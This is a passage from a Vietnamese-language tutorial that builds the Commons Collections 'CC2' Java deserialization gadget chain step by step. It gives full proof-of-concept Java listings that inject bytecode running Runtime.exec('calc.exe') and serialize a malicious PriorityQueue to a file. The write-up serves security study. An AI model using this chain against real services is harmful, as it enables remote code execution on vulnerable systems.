class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Máy tính đã được bật.</p><p>Kết hợp với lớp InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        invokerTransformer.transform(templates);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Ctrl + chuột trái</code> nhấn vào phương thức transform của lớp InvokerTransformer để tìm lớp sử dụng phương thức này, lớp TransformingComparator là lớp chúng ta cần chú ý đến. Lớp này có phương thức compare sử dụng transform transformer.</p><p>Phân tích một chút, hàm tạo của lớp này lấy một Transformer gán vào biến transformer, ở đây chúng ta có thể thay bằng InvokerTransformer. Hàm compare sẽ thực thi transform cho object truyền vào với Transformer được truyền từ hàm tạo. Từ đây chúng ta có đoạn code ngắn sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( invokerTransformer);</span><br><span class="line">        transformingComparator.compare(templates, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tiếp theo chúng ta cần lớp gọi đến TransformingComparator.compare. Đi đến phương thức siftDownUsingComparator của lớp PriorityQueue. Phương thức này sử dụng comparator.compare với comparator là một instance của lớp Comparator, chúng ta có thể thay bằng một TransformingComparator.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Loop hết các phần tử trong queue <code>siftDown(i, (E) queue[i])</code>, ctr + chuột trái tiếp vào mảng queue. Nó được set ở readObject rồi thực hiện heapify(). Quá thuận tiện, bây giờ chỉ còn bước còn lại để xây dựng POC.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read in all elements.</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">    queue[i] = s.readObject();</span><br></pre></td></tr></table></figure><p>Nó thực hiện loop từ 0 đến size-1, size ở đây là private nên chúng ta sẽ set bằng reflection. queue ở đây được gán bằng s.readObject nhưng chúng ta cần queue này là một TemplatesImpl, chúng ta không thể điều khiển được nó. Vậy là chúng ta phải sử dụng đến ChainedTransformer như ở CC1.<br>Ta có hai phương án để thực hiện:</p><ul><li>Sử dụng ChainedTransformer để tự động thực hiện mà không cần thông qua queue</li><li>Set giá trị cho queue</li></ul><p>Set giá trị cho queue.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer&lt;&gt;(</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer&lt;&gt;(templates),</span></span><br><span class="line"><span class="comment">//                invokerTransformer</span></span><br><span class="line"><span class="comment">//        );</span></span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//transformingComparator.compare(null, null);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"><span class="comment">//        Field queue=priorityQueue.getClass().getDeclaredField(&quot;queue&quot;);</span></span><br><span class="line"><span class="comment">//        queue.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        queue.set(priorityQueue,new Object[]&#123;templates,templates&#125;);</span></span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tuy nhiên như này thì nó đã chạy câu lệnh trước khi chúng ta thực hiện unserialize. Bởi vì ở phương thức add gọi đến offer –&gt; siftUp –&gt; siftUpUsingComparator –&gt; Comparator.compare. Để không thực hiện cái này, ở hàm siftUp nó check Comparator nếu Comparator bằng null thì nó sẽ không thực hiện Comparator.compare. Do đó chúng có thể thực hiện set Comparator sau add giá trị vào priorityQueue.<br>Một vấn đề nữa nếu không set comparator nó sẽ gọi đến siftUpComparable và sẽ xuất hiện lỗi <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code>. Do đó chúng ta phải nghĩ cách khác.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, transformingComparator);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title 